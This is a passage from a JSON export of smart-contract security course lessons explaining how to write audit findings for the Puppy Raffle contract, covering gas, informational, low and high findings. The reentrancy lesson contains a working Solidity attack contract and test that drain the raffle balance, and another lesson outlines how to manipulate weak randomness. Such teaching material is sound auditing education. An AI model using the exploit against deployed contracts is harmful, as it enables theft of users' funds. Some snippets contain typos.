          "markdownContent": "---\ntitle: Submitting a Competitive Audit Finding\n---\n\n_Follow along with this video:_\n\n---\n\n### Submitting a Competitive Audit Finding\n\nWe've come a long way in this guide, and now it's time to learn how to submit your findings in a CodeHawks competitive audit. As you follow along with me, remember that your write-ups need to demonstrate your skills and abilities as a security researcher. The better quality they are, the more chances you stand to earn additional rewards.\n\n> **Note:** In this lesson we walkthrough submitting a finding in a CodeHawks First Flight. First Flights are held every two weeks generally, so if one isn't currently accepting submissions, be sure to come back!\n\nNavigate to an active CodeHawks First Flight and click the link `Submit a Finding`.\n\n<img src=\"/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding1.png\" style=\"width: 75%; height: auto;\">\n\nSome of this should seem very familiar. We can enter a title and choose an appropriate severity.\n\n- The title of a competitive audit submission can omit the [S-#] categorization. This will ultimately be prepended by judges if the report is deemed valid.\n- Remember: a good title is comprised of Root Cause + Impact!\n\nFor `Relevant GitHub Links`, we're meant to provide a link, not just to the code base/contract, but to the specific lines we've identified as problematic. Using our DoS Vulnerability from `PuppyRaffle.sol` as an example, we can link directly to the loop in our `enterRaffle` function by right-clicking the line in GitHub and chooosing `copy permalink`.\n\n<img src=\"/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding2.png\" style=\"width: 75%; height: auto;\">\n\nTake some time to view the README of the First Flight you're looking at. You'll find important information for the contest available such as:\n\n- Start/End dates and times\n- Prize Distributions\n- Audit Scope\n- Compatibilities\n- Roles\n\nNow we reach the `Finding` section of the submission. You'll see a basic template provided to you. It's entirely acceptable to overwrite this template and paste the reports formatted as we've learnt so far into this field.\n\nOnce our write up looks good, we can even select `Preview` at the top to see what it looks like with formatting applied.\n\n> **Note:** Proof of Concept/Code are nearly _mandatory_ to be considered a good submission.\n\nOnce you're satisfied with how things look, click `Submit Finding`. This should route you to `My Report` when you can see a summary of everything you've submitted for the audit so far. You can also make modifications to your submitted findings while the contest is open.\n\n### The Selected Report\n\nSomething to always strive for is quality in the write ups you submit. In competitive audits submitting a finding that is a duplicate with other auditors is common. Platforms will reward an attention to submission quality by choosing a `selected report`. This reports represent the best quality write up for a given vulnerability and these reports receive _bonus payouts_.\n\n<img src=\"/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding4.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nOnce a First Flight or Competitive Audit concludes, you'll be able to navitgate to `My Findings` in CodeHawks and download your submissions in markdown. It's worthwhile to add these to your portfolio to show your skills and experience to the world!\n\nThat's all there is to submitting to a competitive audit! From there a judge will take over. Be sure to sign up to CodeHawks, I promise you that participating in competitive audits and First Flights will supercharge your abilities as a security researcher.\n\nLet's start finally writing things up in the next lesson!\n",
          "updates": []
        },
        {
          "lessonId": "c7def483-fe9d-4db3-bcd1-33aa4330af86",
          "number": 47,
          "title": "Reporting templates",
          "slug": "reporting-templates",
          "folderName": "47-reporting-templates",
          "description": "",
          "duration": 3,
          "videoUrl": "022dgMG01duWP2i9vBhErS01cnYDKAPvM8SCL93hjaT1bk",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/47-reporting-templates/+page.md",
          "markdownContent": "---\ntitle: Reporting - Templates\n---\n\n_Follow along with this video:_\n\n---\n\n### Reporting Templates\n\nThroughout this course we have been, and will continue to use our [**audit-report-templating**](https://github.com/Cyfrin/audit-report-templating) repo to assist us with generating our final findings reports. I wanted to take a moment to make you aware of some alternatives, should you wish to try them out.\n\n### Cyfrin GitHub Report Template\n\n[**audit-repo-cloner**](https://github.com/Cyfrin/audit-repo-cloner)\n\nOn the Cyfrin team, we won't write up reports in markdown, we actually report our findings through issues directly on the GitHub repo, this is beneficial for collaborative situations. We use this repo cloner to prepare a repo for an audit by the Cyfrin team. From the README:\n\n```\nIt will take the following steps:\n\n1. Take the source repository you want to set up for audit\n2. Take the target repository name you want to use for the private --repo\n3. Add an issue_template to the repo, so issues can be formatted as audit findings, like:\n\n'''\n**Description:**\n**Impact:**\n**Proof of Concept:**\n**Recommended Mitigation:**\n**[Project]:**\n**Cyfrin:**\n'''\n\n4. Update labels to label issues based on severity and status\n5. Create an audit tag at the given commit hash (full SHA)\n6. Create branches for each of the auditors participating\n7. Create a branch for the final report\n8. Add the report-generator-template to the repo to make it easier to compile the report, and add a button in GitHub actions to re-generate the report on-demand\n9. Attempt to set up a GitHub project board\n```\n\n### Report Generator Template\n\n[**report-generator-template**](https://github.com/Cyfrin/report-generator-template)\n\nThis is a fork of the [**Spearbit Report Generator**](https://github.com/spearbit-audits/report-generator-template) and is used to consolidate issues/projects on a GitHub repo into a PDF Audit report.\n\nFrom the README:\n\n```\nThis repository is meant to be a single-step solution to:\n\n- Fetch all issues from a given repository\n- Sort them by severity according to their labels\n- Generate a single Markdown file with all issues sorted by descending severity\n- Integrate that Markdown file into a LaTeX template\n- Generate a PDF report with all the issues and other relevant information\n\n```\n\nThese tools/templates are especially great when working with a team. They save you from having to manually consolidate markdown write ups. If this is a method you'd like to try in your own auditing process, I encourage you to experiment and determine what works best for you!\n\nFor the purposes of this course, we'll continue with the methods we've been using thus far.\n\nNow, we won't _always_ be writing the reports together, but it's imperative that you put in the time to practice. The ability to create high quality reports is necessary for becoming a successful security researcher. Practice, get good at it. Get comfortable with `Proofs of Concept/Code`.\n\nLet's finally get to writing this one together though!\n",
          "updates": []
        },
        {
          "lessonId": "813dc962-8458-4d4d-9a82-8abf3d92639e",
          "number": 48,
          "title": "Reporting: Floating pragma",
          "slug": "reporting-floating-pragma",
          "folderName": "48-reporting-floating-pragma",
          "description": "",
          "duration": 2,
          "videoUrl": "lnhM01BzVd3rWWQASg0000WHDbAFWNbR3jivlVTOvtQCv00",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/48-reporting-floating-pragma/+page.md",
          "markdownContent": "---\ntitle: Reporting - Floating Pragma\n---\n\n_Follow along with this video:_\n\n---\n\n### Floating Pragma\n\nThe first finding we're going to add to our `findings.md` comes from our notes on `floating pragma`. Remember, we can look through the repo for notes we've left by searching for our `@Audit` tag.\n\nThis one should be easy for us as `Aderyn` caught it, and did most of the write up for us. Lets look at what `Aderyn` output.\n\n````\n## L-2: Solidity pragma should be specific, not wide\n\nConsider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`\n\n- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)\n\n\t```solidity\n\tpragma solidity ^0.7.6;\n\t```\n````\n\nAt this point you may wish to copy the [**finding_layout.md**](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/audit-data/audit-data/finding_layout.md) template we've been following into your audit repo.\n\n`Aderyn's` output actually looks really great. I personally would rate this as an informational, so I'm going to make a few changes/formatting adjustments, but ultimately this is what it's going to look like, easy!\n\n````\n### I-1: Solidity pragma should be specific, not wide\n\nConsider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`\n\n- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)\n\n\t```solidity\n\tpragma solidity ^0.7.6;\n\t```\n````\n\nBe sure to note your finding as actioned in your code base notes, and lets move onto the next one!\n\n```js\n// report-written: use of floating pragma is bad!\n```\n",
          "updates": []
        },
        {
          "lessonId": "a347c526-6e3d-4572-a6ff-f4d920f10680",
          "number": 49,
          "title": "Reporting: Incorrect solc version",
          "slug": "reporting-incorrect-solc-version",
          "folderName": "49-reporting-incorrect-solc-version",
          "description": "",
          "duration": 2,
          "videoUrl": "im9q1Wpc901UCiih1BLDZg6ewD6McHGyv5GzzxzDkNXU",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/49-reporting-incorrect-solc-version/+page.md",
          "markdownContent": "---\ntitle: Reporting - Incorrect Solc Version\n---\n\n_Follow along with this video:_\n\n---\n\n### Incorrect Solc Version\n\nThe next finding we're going to write up is another `informational` it seems. We identified in an earlier lesson that Puppy Raffle is using an outdated version of Solidity!\n\nIn this circumstance, `Slither` caught this one for us. It can often be valuable to pull from the Slither Documentation for references and recommendations for these types of findings. To add this to our `findings.md` it would look something like this:\n\n```\n### [I-2] Using an Outdated Version of Solidity is Not Recommended\n\nsolc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.\nRecommendation\n\n**Recommendations:**\n\nDeploy with any of the following Solidity versions:\n\n    0.8.18\n\nThe recommendations take into account:\n\n    Risks related to recent releases\n    Risks of complex code generation changes\n    Risks of new language features\n    Risks of known bugs\n\nUse a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.\n\n```\n\nI'll mention as well, I know we have a finding template - and we'll absolutely use it soon - but for informational findings, they're often simplistic enough that being less verbose is acceptable.\n\nNext lesson - Next vulnerability!\n",
          "updates": []
        },
        {
          "lessonId": "1a7e975c-377d-4962-a28d-e9f95e774968",
          "number": 50,
          "title": "Reporting: Unchanged state variables should be immutable or constant",
          "slug": "reporting-unchanged-state-variables-should-be-immutable-or-constant",
          "folderName": "50-reporting-unchanged-state-variables-should-be-immutable-or-constant",
          "description": "",
          "duration": 2,
          "videoUrl": "3LwLVQ5u74onsAKUEcWmSuZUzV2osOKQekJTC7YLVr4",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/50-reporting-unchanged-state-variables-should-be-immutable-or-constant/+page.md",
          "markdownContent": "---\ntitle: Reporting - Unchanged State Variables Should Be Immutable Or Constant\n---\n\n_Follow along with this video:_\n\n---\n\n### Unchanged State Variables Should Be Constant or Immutable\n\nSearching for our @Audit comment again, it looks like the next finding we identified was:\n\n```js\n// @Audit-Gas: raffleDuration doesn't change and should be immutable.\n```\n\nNow, just a few lines further in the contract, we've also noted that several variables should be `constant`.\n\n```js\n// @Audit-Gas: Unchanged state variables can be marked as constant\nstring private commonImageUri = \"ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8\";\nstring private rareImageUri = \"ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW\";\nstring private legendaryImageUri = \"ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU\";\n```\n\nWe should compile these into a single gas issue in our `findings.md` document.\n\n```md\n#Gas\n\n### [G-1] Unchanged state variables should be declared constant or immutable\n\nReading from storage is much more expensive than reading a constant or immutable variable.\n\nInstances:\n\n- `PuppyRaffle::raffleDuration` should be `immutable`\n- `PuppyRaffle::commonImageUri` should be `constant`\n- `PuppyRaffle::rareImageUri` should be `constant`\n- `PuppyRaffle::legendaryImageUri` should be `constant`\n```\n\nGreat! Done! Make note in the contract that we've written up this finding and lets move on to the next.\n",
          "updates": []
        },
        {
          "lessonId": "87a6e0ce-8924-4e56-93f5-c290141ba586",
          "number": 51,
          "title": "Reporting: Zero address check",
          "slug": "reporting-zero-address-check",
          "folderName": "51-reporting-zero-address-check",
          "description": "",
          "duration": 1,
          "videoUrl": "q02pwE2OhfpJ00v9uksMLGehGxntAB49Jx5Oz3ayhFiZI",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/51-reporting-zero-address-check/+page.md",
          "markdownContent": "---\ntitle: Reporting - Zero Address Check\n---\n\n_Follow along with this video:_\n\n---\n\n### Zero Address Check\n\nWe're flying through these! Next note that comes up when we search our `@Audit` tag is ...\n\n```js\nconstructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 (\"Puppy Raffle, \"PR\"\"){\n// @Audit: check for zero address!\n...\n}\n```\n\nThis is another finding `Aderyn` caught for us, we can just copy and paste this write up into our report like so:\n\n````md\n### [I-3] Missing checks for `address(0)` when assigning values to address state variables\n\nAssigning values to address state variables without checking for `address(0)`.\n\n- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)\n\n  ```solidity\n          feeAddress = _feeAddress;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)\n\n  ```solidity\n          previousWinner = winner;\n  ```\n\n- Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)\n\n  ```solidity\n          feeAddress = newFeeAddress;\n  ```\n````\n\nLeveraging our tools is a great way to speed up the write up process. Thanks, `Aderyn`! Mark the note as complete and we'll move on to the next finding!\n\n```js\nconstructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 (\"Puppy Raffle, \"PR\"\"){\n// @Written: check for zero address!\n...\n}\n```\n",
          "updates": []
        },
        {
          "lessonId": "b05095c5-9cdf-4737-8c9e-1c9c3d6b7156",
          "number": 52,
          "title": "Reporting: Storage variables in loops should be cached",
          "slug": "reporting-storage-variables-in-loops-should-be-cached",
          "folderName": "52-reporting-storage-variables-in-loops-should-be-cached",
          "description": "",
          "duration": 2,
          "videoUrl": "3xflgJsmhwWq4yQLCFsAN302kr9rwu01dlgyRsrMebfp00",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/52-reporting-storage-variables-in-loops-should-be-cached/+page.md",
          "markdownContent": "---\ntitle: Reporting - Storage Variables In Loops Should Be Cached\n---\n\n_Follow along with this video:_\n\n---\n\n### Storage Variables in a Loop Should be Cached\n\nSearching again for our `@Audit` tag, we should next come across\n\n```js\n// @Audit-Gas: uint256 playerLength = players.length\n```\n\nThis finding is pointing to a waste of gas incurred by having to always read from storage. In the `enterRaffle` function, Puppy Raffle is checking for duplicates in an inefficient way. We were going to recommend removing this check entirely elsewhere, but we should still report this gas issue.\n\n````md\n### [G-2] Storage Variables in a Loop Should be Cached\n\nEverytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.\n\n```diff\n+ uint256 playersLength = players.length;\n- for (uint256 i = 0; i < players.length - 1; i++) {\n+ for (uint256 i = 0; i < playersLength - 1; i++) {\n-    for (uint256 j = i + 1; j < players.length; j++) {\n+    for (uint256 j = i + 1; j < playersLength; j++) {\n      require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n}\n}\n```\n````\n\nUsing a diff shows clearly what adjustments should be made to optimized for gas.\n\nNext finding!\n",
          "updates": []
        },
        {
          "lessonId": "aa20a390-002b-4fb2-b7fe-10459f334b3c",
          "number": 53,
          "title": "Reporting Findings We'll Cover Later",
          "slug": "reporting-findings-we'll-cover-later",
          "folderName": "53-reporting-findings-we'll-cover-later",
          "description": "",
          "duration": 1,
          "videoUrl": "iW7Xulrh3BtIZ01E0101y4G9OKJ300wdyx6TGuw9kWs7sp4",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/53-reporting-findings-we'll-cover-later/+page.md",
          "markdownContent": "---\ntitle: Reporting - Findings We'll Cover Later\n---\n\n_Follow along with this video:_\n\n---\n\nThe next time you search your `@Audit` tag, you may come across a note I briefly mentioned on an MEV vulnerability in Puppy Raffle's `refund` function.\n\n```js\nfunction refund(uint256 playerIndex) public {\n    // @Audit: MEV\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n    require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n    // slither-disable-next-line reentrancy-no-eth,reentrancy-events\n    payable(msg.sender).sendValue(entranceFee);\n\n    players[playerIndex] = address(0);\n    emit RaffleRefunded(playerAddress);\n    }\n```\n\nWe're actually going to skip this one for now. MEV's are something we'll return to later in the course to gain a deeper understanding of how they work.\n\nFor now, just mark this note as skipped and we'll continue to the next vulnerability.\n",
          "updates": []
        },
        {
          "lessonId": "a8dc1aa0-fbfd-4f90-bf52-13a07322c785",
          "number": 54,
          "title": "Reporting Reentrancy",
          "slug": "reporting-reentrancy",
          "folderName": "54-reporting-reentrancy",
          "description": "",
          "duration": 8,
          "videoUrl": "QM9fgv9GOhI02Hv00cbvVTAZc4dDLQtXVGDjoVlhQ002OA",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/54-reporting-reentrancy/+page.md",
          "markdownContent": "---\ntitle: Reporting - Reentrancy\n---\n\n_Follow along with this video:_\n\n---\n\n### Reporting Reentrancy\n\nThe next finding on our list is `reentrancy`, we finally get to write this up!\n\nWe know this is going to be a high, based on everything we went over and all we learnt about this vulnerability. Keeping in mind `<ROOT CAUSE> + <IMPACT>`, lets write a suitable title.\n\n---\n\n**Title:**\n\n```\n### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance\n```\n\n> **Note:** It's often a good idea to go through the steps of building a PoC to prove an issue before taking the time to write things up. We wrote a test for reentracy, that we'll be using, earlier.\n\nOn to the next parts of the report template.\n\n---\n\nFor our description, we want to detail the specifics of the vulnerability, where it's located and the impact it has, using code snippets is a great way to point to trouble areas being discussed.\n\n````\n\n**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.\n\nIn the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.\n\n```js\nfunction refund(uint256 playerIndex) public {\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n    require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n\n@>  payable(msg.sender).sendValue(entranceFee);\n@>  players[playerIndex] = address(0);\n\n    emit RaffleRefunded(playerAddress);\n}\n    ```\n````\n\n---\n\nNext up is impact, let's clearly detail the effect of this vulnerability being exploited.\n\n```\n**Impact:** All fees paid by raffle entrants could be stolen by a malicious participant.\n```\n\nSimple enough.\n\n---\n\nFortunately we wrote a test for the reentrancy vulnerability earlier, so we can absolutely paste that here. I like to explicitly walk through the steps of the exploit as well.\n\n````\n**Proof of Concept:**\n\n1. User enters the raffle\n2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`\n3. Attacker enters the raffle\n4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.\n\n<details>\n<summary>PoC Code</summary>\n\nAdd the following to `PuppyRaffle.t.sol`\n\n    ```js\ncontract ReentrancyAttacker {\n    PuppyRaffle puppyRaffle;\n    uint256 entranceFee;\n    uint256 attackerIndex;\n\n    constructor(PuppyRaffle _puppyRaffle) {\n        puppyRaffle = _puppyRaffle;\n        entranceFee = puppyRaffle.entranceFee();\n    }\n\n    function attack() public payable {\n        address[] memory players = new address[](1);\n        players[0] = address(this);\n        puppyRaffle.enterRaffle{value: entranceFee}(players);\n        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));\n        puppyRaffle.refund(attackerIndex);\n    }\n\n    function _stealMoney() internal {\n        if (address(puppyRaffle).balance >= entranceFee) {\n            puppyRaffle.refund(attackerIndex);\n        }\n    }\n\n    fallback() external payable {\n        _stealMoney();\n    }\n\n    receive() external payable {\n        _stealMoney();\n    }\n}\n\n// test to confirm vulnerability\nfunction testCanGetRefundReentrancy() public {\n    address[] memory players = new address[](4);\n    players[0] = playerOne;\n    players[1] = playerTwo;\n    players[2] = playerThree;\n    players[3] = playerFour;\n    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);\n\n    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);\n    address attacker = makeAddr(\"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    uint256 startingAttackContractBalance = address(attackerContract).balance;\n    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;\n\n    // attack\n\n    vm.prank(attacker);\n    attackerContract.attack{value: entranceFee}();\n\n    // impact\n    console.log(\"attackerContract balance: \", startingAttackContractBalance);\n    console.log(\"puppyRaffle balance: \", startingPuppyRaffleBalance);\n    console.log(\"ending attackerContract balance: \", address(attackerContract).balance);\n    console.log(\"ending puppyRaffle balance: \", address(puppyRaffle).balance);\n}\n    ```\n</details>\n````\n\n---\n\nLast part - Recommendation. We know this, this protocol should be following CEI.\n\n````\n**Recommendation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.\n\n    ```diff\n    function refund(uint256 playerIndex) public {\n        address playerAddress = players[playerIndex];\n        require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n        require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n    +   players[playerIndex] = address(0);\n    +   emit RaffleRefunded(playerAddress);\n        payable(msg.sender).sendeValue(entranceFees);\n    -   players[playerIndex] = address(0);\n    -   emit RaffleRefunded(playerAddress);\n    }\n    ```\n````\n\n---\n\nGreat! That's all there is to our `reentrancy` report. Be sure to mark these audit notes as actioned and we'll move on to the next vulnerability!\n",
          "updates": []
        },
        {
          "lessonId": "565e190d-95f9-4d4f-9091-637e52e2c61c",
          "number": 55,
          "title": "Reporting: getActivePlayerindex",
          "slug": "reporting-getActivePlayerIndex-incorrect-for-edge-case",
          "folderName": "55-reporting-getActivePlayerIndex-incorrect-for-edge-case",
          "description": "",
          "duration": 5,
          "videoUrl": "rrpN3S3H02pZ00xmnNhg6juOKj02otr5I28KnTc27I7x01A",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/55-reporting-getActivePlayerIndex-incorrect-for-edge-case/+page.md",
          "markdownContent": "---\ntitle: Reporting - getActivePlayerIndex Incorrect For Edge Case\n---\n\n_Follow along with this video:_\n\n---\n\n### getActivePlayerIndex Incorrect for Edge Case\n\nNext finding we marked down was regarding `getActivePlayerIndex`. The issue we outlined here was, if a player exists at index 0, they may erroneously believe they are not entered into the raffle.\n\nLet's begin the write up with a title. There's some argument to be had that a vulnerability of this nature would be `Medium Severity`. If we consider however, that the impact is really only affecting a single user, `Low` could be appropriate as well, noting that the likelihood is a bit of a toss up - is it high, because it certainly happens if player[0] calls this function, or is it low because _only_ player[0] can call this function?\n\nUltimately we're going to record this as a low. My title is going to look like so:\n\n```\n[L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and players at index 0 causing players to incorrectly think they have not entered the raffle\n```\n\nRoot Cause. Impact. Classic. ðŸ˜†\n\nNEXT, DESCRIPTION! Define where the bug is and how it's encountered/exploited.\n\n````\n**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec it will also return zero if the player is NOT in the array.\n\n\n    ```js\n    function getActivePlayerIndex(address player) external view returns (uint256) {\n        for (uint256 i = 0; i < players.length; i++) {\n            if (players[i] == player) {\n                return i;\n            }\n        }\n        return 0;\n    }\n    ```\n````\n\nImpact. Let's spell out the practical effect of this bug\n\n```\n**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.\n```\n\nA Proof of Code/Concept is something we should always strive to include in our reports. For `Low Severity` issues however, it may not be necessary to extraneously include test cases et al for what are otherwise simple to describe issues.\n\nFor this report, I'm just going to outline the steps that lead to encountering the vulnerability.\n\n```\n**Proof of Concept:**\n\n1. User enters the raffle, they are the first entrant\n2. `PuppyRaffle::getActivePlayerIndex` returns 0\n3. User thinks they have not entered correctly due to the function documentation\n```\n\nAs for mitigations, there are a few things that could solve this issue for the protocol. There's no reason to limit ourselves to just one.\n\n```\n**Recommendations:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.\n\nYou could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.\n```\n\nDone!\n\n### Wrap Up\n\nWe're getting really quick at these write ups now. You can see that the severity of an issue uncovered often pertains to the complexity of it's write up.\n\nWe've a few more reports to complete, lets keep going.\n",
          "updates": []
        },
        {
          "lessonId": "9b6aa31f-a11a-43d3-ac79-5361ac447c50",
          "number": 56,
          "title": "Reporting: Should Follow CEI",
          "slug": "reporting-should-follow-cei",
          "folderName": "56-reporting-should-follow-cei",
          "description": "",
          "duration": 2,
          "videoUrl": "UH4i6O3jqmRTqQoVPkonfZdrpy01Gd00DQEHbAZMt7WEk",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/56-reporting-should-follow-cei/+page.md",
          "markdownContent": "---\ntitle: Reporting - Should Follow CEI\n---\n\n_Follow along with this video:_\n\n---\n\n### selectWinner Should Follow CEI\n\nTaking a look at our next `@Audit` tag, this finding should be another quick one. We'd identified that the `selectWinner` function was another instance where PuppyRaffle isn't following CEI (Checks, Effects, Interactions). However, unlike our `reentrancy` situation, there doesn't seem to be a way to exploit it in `selectWinner`. Resultingly, this is going to be our 4th `informational`.\n\n````\n**Title:** [I-4] does not follow CEI, which is not a best practice\n\nIt's best to keep code cleaen and follow CEI (Checks, Effects, Interactions).\n\n    ```diff\n-   (bool success,) = winner.call{value: prizePool}(\"\");\n-   require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n        _safeMint(winner, tokenId);\n+   (bool success,) = winner.call{value: prizePool}(\"\");\n+   require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n    ```\n````\n\nWith `informational` findings, you may notice our write ups don't always strictly adhere to outlining things like impact. `Informational` findings are often very subjective in both their impact and their recommended fixes. What defines _clean code_, for example, may vary from developer to developer.\n\nWith that said, this write up looks great. Lets move on to `weak randomness` next.\n",
          "updates": []
        },
        {
          "lessonId": "c4b25549-967f-4ff6-81b5-314786b4f966",
          "number": 57,
          "title": "Reporting: Weak Randomness",
          "slug": "reporting-weak-randomness",
          "folderName": "57-reporting-weak-randomness",
          "description": "",
          "duration": 6,
          "videoUrl": "esHpEFhlZ8FNWEGUT501FCLzrmMV1P32mWTywbpo01rmM",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/57-reporting-weak-randomness/+page.md",
          "markdownContent": "---\ntitle: Reporting - Weak Randomness\n---\n\n_Follow along with this video:_\n\n---\n\n### Weak Randomness\n\nOur next marked finding was also in `selectWinner` and is referencing weak randomness.\n\n```js\nfunction selectWinner() external {\n    uint256 winnerIndex =\n        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n        ...\n        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n}\n```\n\nLets consider what the severity of this would be by assessing the Impact and Likelihood.\n\n- **Impact:** High - If someone is able to predict the outcome of a raffle and exploit this knowledge, this fundamentally breaks this protocol's functionality.\n- **Likelihood:** High - A user has a lot of incentive to assure they win, and assure their token is rare. It's very likely this would be exploited.\n\nOur assessment pretty clearly points to this finding being of `High Severity`. Fortunately in previous lessons we already wrote a Proof of Concept for this, so let's take our finding template and start filling it in.\n\n```\n**Title:**\n### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy\n\n**Description:** Hashing `msg.sender`, `block,timestamp` and `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.\n\n**Note:** This additionally means users could front-run this function and call `refund` if they see they are not the winner.\n```\n\nWe'll talk more about front-running and MEV concerns later in the course, but know this exposes a vulnerability of this type here too.\n\nWhat's the impact of this?\n\n```\n**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if a gas war to choose a winner results.\n```\n\nFor our Proof of Concept, lets begin by outlining the details of exploiting this vulnerability. This attack vector is well known, so I might be cheating a little bit by linking to a reference of this exploit - but I challenge you to write a test that proves this vulnerability!\n\n```\n**Proof of Concept:**\n\n1. Validators can know the values of `block.timestamp` and `block.difficulty` ahead of time and usee that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.\n2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!\n3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.\n\nUsing on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.\n```\n\nAnyone who knows me, or as seen any of my other content knows what my recommendation is going to be!\n\n```\n**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as [Chainlink VRF](https://docs.chain.link/vrf)\n```\n\nThat's one more down! Our next finding to write up is `Magic Numbers`!\n",
          "updates": []
        },
        {
          "lessonId": "afad0ae1-70b3-498c-af87-b23de07534ff",
          "number": 58,
          "title": "Reporting: Magic Numbers",
          "slug": "reporting-magic-numbers",
          "folderName": "58-reporting-magic-numbers",
          "description": "",
          "duration": 2,
          "videoUrl": "YZJPFoPoAnSJ8WwzKvLlb7MQ027mPU8FAdDtYCDdtMFE",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/58-reporting-magic-numbers/+page.md",
          "markdownContent": "---\ntitle: Reporting - Magic Numbers\n---\n\n_Follow along with this video:_\n\n---\n\n### Reporting Magic Numbers\n\nNext up, we see the `selectWinner` function come up again with our `@Audit` tag. This time, it's pointing to `magic numbers`. Definitely an `informational` we should write up.\n\n```js\nuint256 prizePool = (totalAmountCollected * 80) / 100;\nuint256 fee = (totalAmountCollected * 20) / 100;\n```\n\nWe see the problem here. When reading through a code base, number literals can make things difficult to understand.\n\nLets add this to our `findings.md` report.\n\n````\n### [I-5] Use of \"magic\" numbers is discouraged\n\nIt can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.\n\nExamples:\n    ```js\n    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;\n    uint256 public constant FEE_PERCENTAGE = 20;\n    uint256 public constant POOL_PRECISION = 100;\n\n    uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;\n    uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;\n    ```\n````\n\nWe could probably be a little more verbose, but for the purposes of an `informational` in a private audit setting, this is sufficient. Mark it as complete and let's move on.\n",
          "updates": []
        },
        {
          "lessonId": "1423bd4e-6f88-4869-8ddf-cc8d3f83720f",
          "number": 59,
          "title": "Reporting: Integer Overflow",
          "slug": "reporting-integer-overflow",
